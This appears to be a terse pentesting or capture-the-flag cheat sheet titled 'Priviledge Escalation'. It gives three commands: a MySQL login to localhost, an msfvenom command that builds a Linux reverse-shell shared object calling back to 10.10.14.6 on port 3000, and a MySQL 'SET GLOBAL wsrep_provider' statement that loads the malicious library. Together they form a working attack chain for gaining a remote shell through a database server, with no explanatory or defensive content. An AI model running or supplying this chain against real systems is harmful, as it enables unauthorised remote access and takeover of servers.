# Priviledge Escalation

```
mysql -h 127.0.0.1 -u username -p
```

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=3000 -f elf-so -o shell.so
```

```
SET GLOBAL wsrep_provider="/path/to/exploit.so";
```